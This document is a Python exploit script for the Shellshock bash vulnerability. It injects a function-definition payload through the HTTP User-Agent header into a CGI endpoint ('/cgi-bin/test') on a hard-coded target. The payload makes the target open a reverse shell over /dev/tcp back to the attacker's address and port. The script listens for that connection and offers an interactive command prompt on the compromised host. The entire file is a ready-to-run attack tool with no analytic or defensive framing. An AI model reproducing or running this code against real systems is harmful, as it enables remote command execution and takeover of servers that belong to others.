from socket import *
import _thread
import time 
import httplib2
import sys

Host="192.168.0.104"
Port=4443
RHost="192.168.0.120"
targetURL="/cgi-bin/test"
pre_pay= "() { :;}; /bin/bash -c  '/bin/bash -i' >& /dev/tcp/"
def exploit():
    try:
        netcatcher = socket(AF_INET, SOCK_STREAM)
        netcatcher.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1)
        attacker = (Host, Port)
        netcatcher.bind(attacker)
        netcatcher.listen(10)
        payload = pre_pay +Host+"/"+str(Port)+" 0>&1 &"
        print("payload{}".format(payload))
        _thread.start_new_thread(do_attack,(RHost,payload,targetURL))
        print("=============[+]  GetConnection [+]============")
    except Exception as identifier:
        print("[!] Error ~{}".format(identifier))
        netcatcher.close()
    except KeyboardInterrupt as identifier:
        print("('^') Exploit stopped mannually")
        netcatcher.close()
    while 1:
        try:
            clnt, addr = netcatcher.accept()
            clnt.settimeout(2)
            rvs = str(clnt.recv(2048),"utf-8")
            print(rvs)
            while 1:
                cmd = input("sumo_reverseshell>>")
                clnt.sendall(str.encode(cmd+"\n"))
                try:
                    time.sleep(2)
                    rvs = str(clnt.recv(2048),"utf-8")
                    print(rvs)
                except Exception as identifier:
                    print("[-] Exploit failed - {}". format(identifier))
        except  Exception as identifier:
            print("[-] Exploit failed - {}".format(identifier))
        except KeyboardInterrupt as identifier:
            print("[-] Exploit mannualy stopped - {}".format(identifier))
            sys.exit()


def do_attack(RHost, Payload, targetURL):
    header = {"user-agent":Payload}      
    try:
        exploit = httplib2.HTTPConnectionWithTimeout(RHost)  
        exploit.request("GET", targetURL,headers=header)
        respons = exploit.getresponse()
    except Exception as identifier:
        print("[!] Error ~ {}".format(identifier))
    if respons.status == 404:
        print("[-] Exploit failed")
    print("Exploit running")
    

exploit()        